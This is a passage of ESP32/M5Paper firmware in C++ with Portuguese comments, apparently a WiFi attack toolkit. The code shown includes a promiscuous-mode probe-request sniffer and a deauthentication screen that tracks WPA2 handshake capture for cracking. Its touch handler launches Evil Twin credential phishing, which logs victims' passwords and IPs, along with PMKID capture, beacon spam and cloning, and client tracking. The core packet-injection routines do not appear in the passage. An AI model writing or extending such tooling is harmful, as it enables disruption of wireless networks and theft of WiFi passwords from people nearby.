    canvas.drawLine(30, y + 40, SCR_W - 30, y + 40, C_LGRAY);
    y += 58;
  };

  char bssidStr[18];
  sprintf(bssidStr, "%02X:%02X:%02X:%02X:%02X:%02X",
          gDeauthTarget.bssid[0], gDeauthTarget.bssid[1], gDeauthTarget.bssid[2],
          gDeauthTarget.bssid[3], gDeauthTarget.bssid[4], gDeauthTarget.bssid[5]);

  row("Alvo:",   String(gDeauthTarget.ssid));
  row("BSSID:",  bssidStr);
  row("Canal:",  String(gDeauthTarget.channel));
  row("Tipo:",   "Deauth Broadcast (todos os clientes)");

  // Status do ataque
  canvas.setTextSize(2); canvas.setTextColor(C_BLACK);
  canvas.setTextDatum(MC_DATUM);

  if (gDeauthRunning) {
    uint32_t elapsed = (millis() - gDeauthStartTime) / 1000;
    char st[48];
    sprintf(st, "%lu pacotes enviados  |  %lu s", gDeauthPackets, elapsed);
    canvas.drawString(st, SCR_W / 2, y + 16);

    // Barra de progresso animada
    int barFill = (gDeauthPackets % 40) * 11;
    barFill = min(barFill, 440);
    canvas.fillRect(30, y + 38, barFill, 10, C_BLACK);
    canvas.drawRect(30, y + 38, 440, 10, C_LGRAY);
  } else if (gDeauthPackets > 0) {
    char st[40];
    sprintf(st, "Parado  |  %lu pacotes enviados", gDeauthPackets);
    canvas.drawString(st, SCR_W / 2, y + 16);
  } else {
    canvas.drawString("Pronto. Toque em Iniciar.", SCR_W / 2, y + 16);
  }
  canvas.setTextDatum(TL_DATUM);

  // ── Painel de Captura de Handshake WPA2 ──────────────────
  int hy = y + 56;
  canvas.drawLine(30, hy - 6, SCR_W - 30, hy - 6, C_LGRAY);
  canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
  canvas.drawString("HANDSHAKE WPA2:", 30, hy);

  bool     hsF1 = false, hsF2 = false, hsOk = false;
  uint8_t  hsClient[6] = {};
  if (gHandshakeMutex && xSemaphoreTake(gHandshakeMutex, 10) == pdTRUE) {
    hsF1 = gHandshake.hasFrame1;
    hsF2 = gHandshake.hasFrame2;
    hsOk = gHandshakeComplete;
    memcpy(hsClient, gHandshake.clientMac, 6);
    xSemaphoreGive(gHandshakeMutex);
  }

  canvas.setTextSize(2);
  canvas.setTextColor(hsF1 ? C_BLACK : C_LGRAY);
  canvas.drawString(hsF1 ? "[F1 OK]" : "[F1 --]", 200, hy - 2);
  canvas.setTextColor(hsF2 ? C_BLACK : C_LGRAY);
  canvas.drawString(hsF2 ? "[F2 OK]" : "[F2 --]", 390, hy - 2);

  if (hsOk) {
    canvas.fillRect(10, hy + 22, SCR_W - 20, 44, C_BLACK);
    canvas.setTextColor(C_WHITE); canvas.setTextSize(2);
    canvas.setTextDatum(MC_DATUM);
    canvas.drawString("HANDSHAKE CAPTURADO!", SCR_W / 2, hy + 33);
    canvas.setTextSize(1);
    canvas.drawString(gSdMsg[0] ? gSdMsg : "Veja o Serial para o hash hc22000.", SCR_W / 2, hy + 53);
    canvas.setTextDatum(TL_DATUM);
  } else if (hsF2) {
    char cmac[40];
    snprintf(cmac, sizeof(cmac), "Cliente: %02X:%02X:%02X:%02X:%02X:%02X",
             hsClient[0], hsClient[1], hsClient[2],
             hsClient[3], hsClient[4], hsClient[5]);
    canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
    canvas.drawString(cmac, 580, hy - 2);
  }

  pushFast();
}

// ════════════════════════════════════════════════════════════
//  Probe Request Monitor
// ════════════════════════════════════════════════════════════

void probeCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
  if (type != WIFI_PKT_MGMT) return;

  wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
  uint8_t *data = pkt->payload;
  uint16_t len  = pkt->rx_ctrl.sig_len;

  if (len < 26) return;
  if (((data[0] >> 2) & 0x03) != 0x00) return; // não management
  if (((data[0] >> 4) & 0x0F) != 0x04) return; // não probe request

  char mac[18];
  snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
           data[10], data[11], data[12], data[13], data[14], data[15]);

  uint8_t ssidLen = data[25];
  if (ssidLen > 32 || 26 + ssidLen > len) ssidLen = 0;
  char ssid[33] = {};
  if (ssidLen > 0) {
    memcpy(ssid, &data[26], ssidLen);
    for (int i = 0; i < ssidLen; i++)
      if (ssid[i] < 0x20 || ssid[i] > 0x7E) ssid[i] = '?';
  } else {
    strncpy(ssid, "[Wildcard]", 32);
  }

  if (xSemaphoreTake(gProbeMutex, 0) != pdTRUE) return;

  for (int i = 0; i < gProbeCount; i++) {
    if (strcmp(gProbes[i].mac, mac) == 0) {
      gProbes[i].count++;
      gProbes[i].rssi = pkt->rx_ctrl.rssi;
      gProbeDirty = true;
      xSemaphoreGive(gProbeMutex);
      return;
    }
  }
  if (gProbeCount < MAX_PROBES) {
    strncpy(gProbes[gProbeCount].mac,  mac,  17);
    strncpy(gProbes[gProbeCount].ssid, ssid, 32);
    gProbes[gProbeCount].rssi  = pkt->rx_ctrl.rssi;
    gProbes[gProbeCount].count = 1;
    gProbeCount++;
    gProbeDirty = true;
  }
  xSemaphoreGive(gProbeMutex);
}

void startProbeCapture() {
  xSemaphoreTake(gProbeMutex, portMAX_DELAY);
  gProbeCount = 0; gProbeDirty = false; gProbeScrollOff = 0;
  memset(gProbes, 0, sizeof(gProbes));
  xSemaphoreGive(gProbeMutex);

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_promiscuous_rx_cb(probeCallback);
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);

  gProbeChannel   = 1;
  gLastChanChange = millis();
  gProbeRunning   = true;
  gLastProbeRefresh = 0;
}

void stopProbeCapture() {
  esp_wifi_set_promiscuous(false);
  esp_wifi_set_promiscuous_rx_cb(nullptr);
  gProbeRunning = false;
}

void drawProbe() {
  canvas.fillSprite(C_WHITE);
  drawHeader("Probe Monitor");

  drawBtn(SCR_W-330, 8, 110, 46, gProbeRunning ? "Parar" : "Iniciar", gProbeRunning);
  drawBtn(SCR_W-214, 8, 100, 46, "Limpar");
  drawBtn(SCR_W-108, 8, 100, 46, "Menu");

  // Status bar
  canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
  if (gProbeRunning) {
    char st[48];
    sprintf(st, "CAPTURANDO  |  Canal: %2d  |  %d dispositivo(s)", gProbeChannel, (int)gProbeCount);
    canvas.drawString(st, 18, LIST_TOP - 18);
  } else {
    char st[40];
    sprintf(st, "PARADO  |  %d dispositivo(s) capturado(s)", (int)gProbeCount);
    canvas.drawString(st, 18, LIST_TOP - 18);
  }
  canvas.drawLine(10, LIST_TOP-4, SCR_W-16, LIST_TOP-4, C_BLACK);

  // Cabeçalho da tabela
  int hy = LIST_TOP + 2;
  canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
  canvas.drawString("MAC",            22, hy);
  canvas.drawString("SSID PROCURADO", 220, hy);
  canvas.drawString("RSSI",           560, hy);
  canvas.drawString("SIG",            650, hy);
  canvas.drawString("PROBES",         720, hy);
  canvas.drawLine(10, hy+14, SCR_W-16, hy+14, C_DGRAY);

  if (gProbeCount == 0) {
    canvas.setTextSize(2); canvas.setTextDatum(MC_DATUM); canvas.setTextColor(C_BLACK);
    canvas.drawString(gProbeRunning ? "Aguardando probe requests..." : "Sem dados. Toque em Iniciar.",
                      SCR_W/2, SCR_H/2 + 40);
    canvas.setTextDatum(TL_DATUM);
    pushFast(); return;
  }

  // Copia buffer com mutex (thread-safe)
  xSemaphoreTake(gProbeMutex, portMAX_DELAY);
  int count = gProbeCount;
  ProbeInfo local[MAX_PROBES];
  memcpy(local, (void *)gProbes, count * sizeof(ProbeInfo));
  xSemaphoreGive(gProbeMutex);

  int tableTop = hy + 18;
  int tROW_H   = 48;
  int visRows  = 8;

  for (int i = 0; i < visRows; i++) {
    int idx = gProbeScrollOff + i; if (idx >= count) break;
    int ry = tableTop + i * tROW_H;
    canvas.fillRect(10, ry, SCR_W-26, tROW_H-2, i%2==0 ? C_WHITE : C_LGRAY);
    canvas.setTextColor(C_BLACK); canvas.setTextSize(1);
    canvas.drawString(local[idx].mac, 22, ry+16);
    String ssid = String(local[idx].ssid);
    if (ssid.length() > 22) ssid = ssid.substring(0, 21) + "~";
    canvas.drawString(ssid, 220, ry+16);
    char rs[12]; sprintf(rs, "%d dBm", local[idx].rssi);
    canvas.drawString(rs, 560, ry+16);
    drawSigBars(650, ry+8, rssiLevel(local[idx].rssi));
    char cnt[8]; sprintf(cnt, "%d", local[idx].count);
    canvas.setTextSize(2); canvas.drawString(cnt, 720, ry+12);
  }

  // Scrollbar
  int sbX = SCR_W-12, sbH = visRows * tROW_H, sbTop = tableTop;
  canvas.drawRect(sbX, sbTop, 4, sbH, C_LGRAY);
  if (count > visRows) {
    int th = sbH * visRows / count, thy = sbTop + sbH * gProbeScrollOff / count;
    canvas.fillRect(sbX, thy, 4, max(th, 12), C_BLACK);
  }

  int footY = SCR_H - 44;
  char pg[32];
  sprintf(pg, "%d-%d de %d", gProbeScrollOff+1, min(gProbeScrollOff+visRows, count), count);
  canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
  canvas.setTextDatum(MC_DATUM); canvas.drawString(pg, SCR_W/2, footY+20);
  canvas.setTextDatum(TL_DATUM);
  if (gProbeScrollOff > 0)                    drawBtn(10,  footY, 130, 38, "^ Anterior");
  if (gProbeScrollOff + visRows < count)      drawBtn(150, footY, 130, 38, "v Proximo");

  pushFast();
}

// ════════════════════════════════════════════════════════════
//  System Info  (+ Reiniciar / Desligar + Edição RTC)
// ════════════════════════════════════════════════════════════

// ── Editor de hora ───────────────────────────────────────────
// Layout: 3 campos (HH / MM / SS) com botões + e − em cada campo
// Centros dos campos: x = 160, 480, 800
static const int ECX[3] = {160, 480, 800}; // centros dos campos

void drawEditTime() {
  canvas.fillSprite(C_WHITE);
  drawHeader("Ajustar Hora");
  drawBtn(SCR_W-110, 8, 102, 46, "Voltar");

  const char *labels[3] = {"Hora", "Min",  "Seg"};
  uint8_t     vals[3]   = {gEditTime.hours, gEditTime.minutes, gEditTime.seconds};

  for (int i = 0; i < 3; i++) {
    drawBtn(ECX[i]-75, 88, 150, 72, "+");
    char buf[4]; sprintf(buf, "%02d", vals[i]);
    canvas.setTextSize(6); canvas.setTextColor(C_BLACK);
    canvas.setTextDatum(MC_DATUM);
    canvas.drawString(buf, ECX[i], 222);
    drawBtn(ECX[i]-75, 298, 150, 72, "-");
    canvas.setTextSize(2); canvas.setTextColor(C_DGRAY);
    canvas.drawString(labels[i], ECX[i], 398);
  }

  // Dois pontos entre os campos
  canvas.setTextSize(5); canvas.setTextColor(C_LGRAY);
  canvas.drawString(":", 310, 210);
  canvas.drawString(":", 630, 210);
  canvas.setTextDatum(TL_DATUM);

  drawBtn(100, 448, 330, 66, "SALVAR", true);
  drawBtn(530, 448, 330, 66, "CANCELAR");
  pushFast();
}

// ── Editor de data ───────────────────────────────────────────
// Layout: 3 campos (AAAA / MM / DD) com botões + e −
void drawEditDate() {
  canvas.fillSprite(C_WHITE);
  drawHeader("Ajustar Data");
  drawBtn(SCR_W-110, 8, 102, 46, "Voltar");

  const char *labels[3] = {"Ano",  "Mes",  "Dia"};
  int         vals[3]   = {gEditDate.year, gEditDate.month, gEditDate.date};
  int         tsizes[3] = {4, 6, 6}; // ano precisa de texto menor para caber 4 dígitos

  for (int i = 0; i < 3; i++) {
    drawBtn(ECX[i]-90, 88, 180, 72, "+");
    char buf[6];
    if (i == 0) sprintf(buf, "%04d", vals[i]);
    else        sprintf(buf, "%02d",  vals[i]);
    canvas.setTextSize(tsizes[i]); canvas.setTextColor(C_BLACK);
    canvas.setTextDatum(MC_DATUM);
    canvas.drawString(buf, ECX[i], 222);
    drawBtn(ECX[i]-90, 298, 180, 72, "-");
    canvas.setTextSize(2); canvas.setTextColor(C_DGRAY);
    canvas.drawString(labels[i], ECX[i], 398);
  }

  // Barras separadoras de data
  canvas.setTextSize(5); canvas.setTextColor(C_LGRAY);
  canvas.drawString("/", 308, 210);
  canvas.drawString("/", 628, 210);
  canvas.setTextDatum(TL_DATUM);

  drawBtn(100, 448, 330, 66, "SALVAR", true);
  drawBtn(530, 448, 330, 66, "CANCELAR");
  pushFast();
}

void drawSysInfo() {
  canvas.fillSprite(C_WHITE);
  drawHeader("System Info");
  drawBtn(SCR_W-110, 8, 102, 46, "Menu");

  m5::rtc_datetime_t dt; M5.Rtc.getDateTime(&dt);

  int y = 82;

  // Linha normal (somente leitura)
  auto row = [&](const char *lbl, const String &val) {
    canvas.setTextSize(2); canvas.setTextColor(C_GRAY); canvas.drawString(lbl, 40, y);
    canvas.setTextColor(C_BLACK); canvas.setTextSize(3); canvas.drawString(val, 280, y-4);
    canvas.drawLine(30, y+40, SCR_W-30, y+40, C_LGRAY); y += 56;
  };

  // Linha editável — exibe indicador "[ Editar ]" na direita
  auto editRow = [&](const char *lbl, const String &val) {
    canvas.setTextSize(2); canvas.setTextColor(C_GRAY); canvas.drawString(lbl, 40, y);
    canvas.setTextColor(C_BLACK); canvas.setTextSize(3); canvas.drawString(val, 280, y-4);
    canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
    canvas.setTextDatum(TR_DATUM);
    canvas.drawString("[ Editar ]", SCR_W-40, y+10);
    canvas.setTextDatum(TL_DATUM);
    canvas.drawLine(30, y+40, SCR_W-30, y+40, C_LGRAY); y += 56;
  };

  char buf[40];
  sprintf(buf, "%02d:%02d:%02d", dt.time.hours, dt.time.minutes, dt.time.seconds);
  editRow("Hora:", buf);
  sprintf(buf, "%04d/%02d/%02d", dt.date.year, dt.date.month, dt.date.date);
  editRow("Data:", buf);
  sprintf(buf, "%d%%", M5.Power.getBatteryLevel());
  row("Bateria:", buf);
  row("Chip:",  "ESP32-D0WDQ6-V3");
  row("Placa:", "M5Paper V1.1");
  sprintf(buf, "%lu KB", ESP.getFreeHeap() / 1024);
  row("RAM Livre:", buf);

  // Botões de energia (y final = 82 + 6×56 = 418)
  canvas.fillRect(30, y+5, SCR_W-60, 2, C_LGRAY);
  drawBtn( 60, y+12, 360, 62, "REINICIAR");
  drawBtn(540, y+12, 360, 62, "DESLIGAR", true);

  // Assinatura
  canvas.setTextSize(1); canvas.setTextColor(C_DGRAY);
  canvas.setTextDatum(MC_DATUM);
  canvas.drawString("Designed by: Tiagob0b", SCR_W/2, y+86);
  canvas.setTextDatum(TL_DATUM);

  pushQuality();
}

// ════════════════════════════════════════════════════════════
//  Handler de Toque
// ════════════════════════════════════════════════════════════

void handleTouch(int tx, int ty) {
  static uint32_t last = 0;
  if (millis() - last < 400) return;
  last = millis();

  switch (gState) {

    case S_MENU:
      if      (inRect(tx,ty, MBTN_X1, MBTN_Y1, MBTN_W, MBTN_H)) doWifiScan();
      else if (inRect(tx,ty, MBTN_X2, MBTN_Y1, MBTN_W, MBTN_H)) {
        // Beacon Spam: modo RANDOM sem AP seleccionado (apIdx=-1)
        gSelected = -1;
        gState = S_BEACON;
        startBeacon(-1);
        drawBeacon();
      }
      else if (inRect(tx,ty, MBTN_X3, MBTN_Y3, MBTN_W3, MBTN_H3)) {
        sdListFiles();
        gState = S_SD_BROWSER;
        drawSdBrowser();
      }
      else if (inRect(tx,ty, MBTN_X1, MBTN_Y2, MBTN_W, MBTN_H)) {
        gState = S_PROBE; startProbeCapture(); drawProbe();
      }
      else if (inRect(tx,ty, MBTN_X2, MBTN_Y2, MBTN_W, MBTN_H)) {
        gState = S_SYSINFO; drawSysInfo();
      }
      break;

    case S_WIFI_LIST:
      if      (inRect(tx,ty, SCR_W-218, 8, 102, 46)) doWifiScan();
      else if (inRect(tx,ty, SCR_W-110, 8, 102, 46)) { gState = S_MENU; drawMenu(); }
      else if (inRect(tx,ty, 10, SCR_H-44, 130, 38) && gScrollOff > 0)
               { gScrollOff--; drawWifiList(); }
      else if (inRect(tx,ty, 150, SCR_H-44, 130, 38) && gScrollOff+VISIBLE_ROWS < gAPCount)
               { gScrollOff++; drawWifiList(); }
      else {
        for (int i = 0; i < VISIBLE_ROWS; i++) {
          int ry = LIST_TOP + i * ROW_H;
          if (inRect(tx, ty, 10, ry, SCR_W-26, ROW_H-2)) {
            int idx = gScrollOff + i;
            if (idx < gAPCount) { gSelected = idx; gState = S_WIFI_DETAIL; drawWifiDetail(idx); }
            break;
          }
        }
      }
      break;

    case S_WIFI_DETAIL:
      if      (inRect(tx,ty, 312, 8, 96, 46)) {   // Evil Twin
        gState = S_EVILTWIN; startEvilTwin(gSelected); drawEviltwin();
      }
      else if (inRect(tx,ty, 416, 8, 96, 46)) {   // Client Tracker
        gState = S_CLIENT; startClient(gSelected); drawClient();
      }
      else if (inRect(tx,ty, 520, 8, 96, 46)) {   // Beacon CLONE
        gState = S_BEACON; startBeacon(gSelected); drawBeacon();
      }
      else if (inRect(tx,ty, 624, 8, 96, 46)) {   // PMKID
        gState = S_PMKID; startPmkid(gSelected); drawPmkid();
      }
      else if (inRect(tx,ty, 728, 8, 96, 46)) {   // Deauth
        gState = S_DEAUTH; startDeauth(gSelected); drawDeauth();
      }
      else if (inRect(tx,ty, 832, 8, 110, 46)) {  // Voltar
        gState = S_WIFI_LIST; drawWifiList();
      }
      break;

    case S_PMKID:
      if      (inRect(tx,ty, SCR_W-218, 8, 102, 46)) {
        if (gPmkidRunning) stopPmkid(); else startPmkid(gSelected);
        drawPmkid();
      }
      else if (inRect(tx,ty, SCR_W-110, 8, 102, 46)) {
        stopPmkid();
        gState = S_WIFI_DETAIL;
        drawWifiDetail(gSelected);
      }
      break;

    case S_DEAUTH:
      if      (inRect(tx,ty, SCR_W-218, 8, 102, 46)) {
        if (gDeauthRunning) stopDeauth(); else resumeDeauth();
        drawDeauth();
      }
      else if (inRect(tx,ty, SCR_W-110, 8, 102, 46)) {
        stopDeauth();
        gState = S_WIFI_DETAIL;
        drawWifiDetail(gSelected);
      }
      break;

    case S_PROBE: {
      if      (inRect(tx,ty, SCR_W-330, 8, 110, 46)) {
        if (gProbeRunning) stopProbeCapture(); else startProbeCapture();
        drawProbe();
      }
      else if (inRect(tx,ty, SCR_W-214, 8, 100, 46)) {
        stopProbeCapture();
        xSemaphoreTake(gProbeMutex, portMAX_DELAY);
        gProbeCount = 0; gProbeDirty = false; gProbeScrollOff = 0;
        xSemaphoreGive(gProbeMutex);
        drawProbe();
      }
      else if (inRect(tx,ty, SCR_W-108, 8, 100, 46)) {
        stopProbeCapture(); gState = S_MENU; drawMenu();
      }
      else if (inRect(tx,ty, 10,  SCR_H-44, 130, 38) && gProbeScrollOff > 0)
               { gProbeScrollOff--; drawProbe(); }
      else if (inRect(tx,ty, 150, SCR_H-44, 130, 38) && gProbeScrollOff+8 < (int)gProbeCount)
               { gProbeScrollOff++; drawProbe(); }
      break;
    }

    case S_SYSINFO: {
      int powerY = 82 + 6*56; // espelha drawSysInfo
      if      (inRect(tx,ty, SCR_W-110, 8, 102, 46))      { gState = S_MENU; drawMenu(); }
      else if (inRect(tx,ty,  60, powerY+12, 360, 62))     { drawBootScreen("Reiniciando..."); delay(400); ESP.restart(); }
      else if (inRect(tx,ty, 540, powerY+12, 360, 62))     { drawBootScreen("Desligando..."); M5.Power.powerOff(); }
      // Linha "Hora" (y=82, altura 54 até a linha de Data)
      else if (inRect(tx,ty, 30, 82, SCR_W-70, 54)) {
        m5::rtc_datetime_t dt; M5.Rtc.getDateTime(&dt);
        gEditTime = dt.time;
        gState = S_EDIT_TIME; drawEditTime();
      }
      // Linha "Data" (y=138, altura 54)
      else if (inRect(tx,ty, 30, 138, SCR_W-70, 54)) {
        m5::rtc_datetime_t dt; M5.Rtc.getDateTime(&dt);
        gEditDate = dt.date;
        gState = S_EDIT_DATE; drawEditDate();
      }
      break;
    }

    case S_EDIT_TIME: {
      if (inRect(tx,ty, SCR_W-110, 8, 102, 46)) { gState = S_SYSINFO; drawSysInfo(); break; }

      for (int i = 0; i < 3; i++) {
        if (inRect(tx, ty, ECX[i]-75, 88, 150, 72)) {   // botão +
          if      (i==0) gEditTime.hours   = (gEditTime.hours   + 1)  % 24;
          else if (i==1) gEditTime.minutes = (gEditTime.minutes + 1)  % 60;
          else           gEditTime.seconds = (gEditTime.seconds + 1)  % 60;
          drawEditTime(); break;
        }
        if (inRect(tx, ty, ECX[i]-75, 298, 150, 72)) {  // botão −
          if      (i==0) gEditTime.hours   = (gEditTime.hours   + 23) % 24;
          else if (i==1) gEditTime.minutes = (gEditTime.minutes + 59) % 60;
          else           gEditTime.seconds = (gEditTime.seconds + 59) % 60;
          drawEditTime(); break;
        }
      }
      if (inRect(tx, ty, 100, 448, 330, 66)) {   // SALVAR
        m5::rtc_datetime_t dt; M5.Rtc.getDateTime(&dt);
        dt.time = gEditTime;
        M5.Rtc.setDateTime(dt);
        gState = S_SYSINFO; drawSysInfo();
      } else if (inRect(tx, ty, 530, 448, 330, 66)) { // CANCELAR
        gState = S_SYSINFO; drawSysInfo();
      }
      break;
    }

    case S_EVILTWIN: {
      // [Iniciar / Parar]
      if (inRect(tx,ty, SCR_W-444, 8, 126, 46)) {
        if (gEvilRunning) stopEvilTwin(); else startEvilTwin(gSelected);
        drawEviltwin();
      }
      // [Deauth ON/OFF]
      else if (inRect(tx,ty, SCR_W-310, 8, 124, 46)) {
        gEvilDeauth = !gEvilDeauth;
        drawEviltwin();
      }
      // [Log] — imprime todas as credenciais no Serial
      else if (inRect(tx,ty, SCR_W-178, 8, 60, 46)) {
        Serial.println("\n====== Evil Twin — Credenciais ======");
        Serial.printf("SSID: %s | Canal: %d\n", gEvilSsid, gEvilChannel);
        for (int i = 0; i < gCredCount; i++)
          Serial.printf("[%d] PASS=%-40s  IP=%s\n", i+1, gCreds[i].pass, gCreds[i].ip);
        if (gEvilCredFile[0]) Serial.printf("SD: %s\n", gEvilCredFile);
        Serial.println("=====================================");
        // Flash visual
        canvas.fillRect(SCR_W-178, 8, 60, 46, C_BLACK);
        canvas.setTextColor(C_WHITE); canvas.setTextSize(2); canvas.setTextDatum(MC_DATUM);
        canvas.drawString("OK", SCR_W-148, 31);
        canvas.setTextDatum(TL_DATUM);
        pushFast(); delay(700);
        drawEviltwin();
      }
      // [Menu]
      else if (inRect(tx,ty, SCR_W-110, 8, 102, 46)) {
        stopEvilTwin(); gState = S_MENU; drawMenu();
      }
      break;
    }

    case S_SD_BROWSER: {
      // [Refresh]
      if (inRect(tx,ty, SCR_W-220, 8, 102, 46)) {
        sdListFiles(); drawSdBrowser();
      }
      // [Menu]
      else if (inRect(tx,ty, SCR_W-110, 8, 102, 46)) {
        gState = S_MENU; drawMenu();
      }
      // Scroll
      else if (inRect(tx,ty, 10,  SCR_H-44, 130, 38) && gSdBrowserScroll > 0)
        { gSdBrowserScroll--; drawSdBrowser(); }
      else if (inRect(tx,ty, 150, SCR_H-44, 130, 38) && gSdBrowserScroll+7 < gSdEntryCount)
        { gSdBrowserScroll++; drawSdBrowser(); }
      // [Abrir]
      else if (inRect(tx,ty, 570, SCR_H-44, 160, 38) && gSdEntrySelIdx >= 0) {
        sdOpenPreview(gSdEntrySelIdx);
        gState = S_SD_PREVIEW;
        drawSdPreview();
      }
      // [Apagar]
      else if (inRect(tx,ty, 738, SCR_H-44, 164, 38) && gSdEntrySelIdx >= 0) {
        sdDeleteSelected();
        drawSdBrowser();
      }
      else {
        // Selecção de linha na tabela
        int tableTop = LIST_TOP + 18;
        int tROW_H   = 50;
        for (int i = 0; i < 7; i++) {
          int idx = gSdBrowserScroll + i; if (idx >= gSdEntryCount) break;
          int ry = tableTop + i * tROW_H;
          if (inRect(tx, ty, 10, ry, SCR_W-26, tROW_H-2)) {
            if (gSdEntrySelIdx == idx) {
              // Segundo toque na mesma linha: abre directamente
              sdOpenPreview(idx);
              gState = S_SD_PREVIEW;
              drawSdPreview();
            } else {
              gSdEntrySelIdx = idx;
              drawSdBrowser();
            }
            break;
          }
        }
      }
      break;
    }

    case S_SD_PREVIEW: {
      // [>> Serial] — só para hc22000
      if (inRect(tx,ty, SCR_W-332, 8, 114, 46) &&
          (gSdPrev.ftype==FT_HANDSHAKE || gSdPrev.ftype==FT_PMKID)) {
        sdDumpHashToSerial();
        // Feedback visual breve
        canvas.fillRect(SCR_W-332, 8, 114, 46, C_BLACK);
        canvas.setTextColor(C_WHITE); canvas.setTextSize(2);
        canvas.setTextDatum(MC_DATUM);
        canvas.drawString("Enviado!", SCR_W-332+57, 31);
        canvas.setTextDatum(TL_DATUM);
        pushFast();
        delay(900);
        drawSdPreview();
      }
      // [Apagar]
      else if (inRect(tx,ty, SCR_W-210, 8, 92, 46)) {
        sdDeleteSelected();
        gState = S_SD_BROWSER;
        drawSdBrowser();
      }
      // [Voltar]
      else if (inRect(tx,ty, SCR_W-110, 8, 102, 46)) {
        gState = S_SD_BROWSER;
        drawSdBrowser();
      }
      // Scroll conteúdo
      else if (inRect(tx,ty, 10,  SCR_H-44, 130, 38) && gSdPreviewScroll > 0)
        { gSdPreviewScroll--; drawSdPreview(); }
      else if (inRect(tx,ty, 150, SCR_H-44, 130, 38))
        { gSdPreviewScroll++; drawSdPreview(); }
      break;
    }

    case S_CLIENT: {
      // [Iniciar/Parar]
      if (inRect(tx,ty, SCR_W-328, 8, 110, 46)) {
        if (gClientRunning) stopClient();
        else                startClient(gClientFilterAP ? gSelected : -1);
        drawClient();
      }
      // [Filtrado/Global] — alterna modo quando parado
      else if (inRect(tx,ty, SCR_W-210, 8, 92, 46) && !gClientRunning) {
        if (gClientFilterAP) {
          // Muda para global (sem filtro AP)
          gClientFilterAP = false;
        } else if (gSelected >= 0 && gSelected < gAPCount) {
          // Muda para filtrado pelo AP seleccionado
          gClientFilterAP = true;
          strncpy(gDeauthTarget.ssid,
                  gAPs[gSelected].ssid.isEmpty() ? "[Oculto]" : gAPs[gSelected].ssid.c_str(), 32);
          parseBssid(gAPs[gSelected].bssid, gDeauthTarget.bssid);
          gDeauthTarget.channel = gAPs[gSelected].channel;
        }
        drawClient();
      }
      // [Menu]
      else if (inRect(tx,ty, SCR_W-110, 8, 102, 46)) {
        stopClient();
        gState = S_MENU; drawMenu();
      }
      // Scroll
      else if (inRect(tx,ty, 10, SCR_H-44, 130, 38) && gClientScrollOff > 0)
        { gClientScrollOff--; drawClient(); }
      else if (inRect(tx,ty, 150, SCR_H-44, 130, 38) && gClientScrollOff+8 < gClientCount)
        { gClientScrollOff++; drawClient(); }
      // [Exportar]
      else if (inRect(tx,ty, 700, SCR_H-44, 120, 38)) {
        saveClients();
        drawClient();
      }
      break;
    }

    case S_BEACON: {
      // [Iniciar/Parar]
      if (inRect(tx,ty, SCR_W-328, 8, 110, 46)) {
        if (gBeaconRunning) stopBeacon();
        else                startBeacon(gBeacon.mode == BMODE_CLONE ? gSelected : -1);
        drawBeacon();
      }
      // [RANDOM/CLONE] — alterna modo (só quando parado)
      else if (inRect(tx,ty, SCR_W-212, 8, 94, 46) && !gBeaconRunning) {
        if (gBeacon.mode == BMODE_RANDOM) {
          // Muda para CLONE com o AP seleccionado (se houver)
          if (gSelected >= 0 && gSelected < gAPCount) {
            gBeacon.mode = BMODE_CLONE;
            strncpy(gBeacon.cloneSsid, gAPs[gSelected].ssid.isEmpty()
                    ? "[Oculto]" : gAPs[gSelected].ssid.c_str(), 32);
            parseBssid(gAPs[gSelected].bssid, gBeacon.cloneMac);
          }
        } else {
          gBeacon.mode = BMODE_RANDOM;
        }
        drawBeacon();
      }
      // [Menu]
      else if (inRect(tx,ty, SCR_W-110, 8, 102, 46)) {
        stopBeacon();
        gState = S_MENU; drawMenu();
      }
      // Canal [<]
      else if (inRect(tx,ty, 200, 112, 52, 36) && !gBeaconRunning) {
        gBeacon.channel = gBeacon.channel > 1 ? gBeacon.channel - 1 : 13;
        drawBeacon();
      }
      // Canal [>]
      else if (inRect(tx,ty, 360, 112, 52, 36) && !gBeaconRunning) {
        gBeacon.channel = gBeacon.channel < 13 ? gBeacon.channel + 1 : 1;
        drawBeacon();
      }
      break;
    }

    case S_EDIT_DATE: {
      if (inRect(tx,ty, SCR_W-110, 8, 102, 46)) { gState = S_SYSINFO; drawSysInfo(); break; }

      // Ano (i=0), Mês (i=1), Dia (i=2) — todos com btn w=180
      for (int i = 0; i < 3; i++) {
        if (inRect(tx, ty, ECX[i]-90, 88, 180, 72)) {   // botão +
          if      (i==0) { if (gEditDate.year  < 2099) gEditDate.year++; }
          else if (i==1) gEditDate.month = gEditDate.month % 12 + 1;
          else           gEditDate.date  = gEditDate.date  % 31 + 1;
          drawEditDate(); break;
        }
        if (inRect(tx, ty, ECX[i]-90, 298, 180, 72)) {  // botão −
          if      (i==0) { if (gEditDate.year  > 2020) gEditDate.year--; }
          else if (i==1) gEditDate.month = (gEditDate.month + 10) % 12 + 1;
          else           gEditDate.date  = (gEditDate.date  + 29) % 31 + 1;
          drawEditDate(); break;
        }
      }
      if (inRect(tx, ty, 100, 448, 330, 66)) {   // SALVAR
        m5::rtc_datetime_t dt; M5.Rtc.getDateTime(&dt);
        dt.date = gEditDate;
        M5.Rtc.setDateTime(dt);
        gState = S_SYSINFO; drawSysInfo();
      } else if (inRect(tx, ty, 530, 448, 330, 66)) { // CANCELAR
        gState = S_SYSINFO; drawSysInfo();
      }
      break;
    }
  }
}

// ════════════════════════════════════════════════════════════
//  Setup & Loop
// ════════════════════════════════════════════════════════════

void setup() {
  Serial.begin(115200);
  auto cfg = M5.config();
  M5.begin(cfg);

  M5.Display.setRotation(1);
  M5.Display.clear(C_WHITE);

  canvas.createSprite(SCR_W, SCR_H);
  canvas.setTextDatum(TL_DATUM);

  gProbeMutex     = xSemaphoreCreateMutex();
  gHandshakeMutex = xSemaphoreCreateMutex();
  gPmkidMutex     = xSemaphoreCreateMutex();
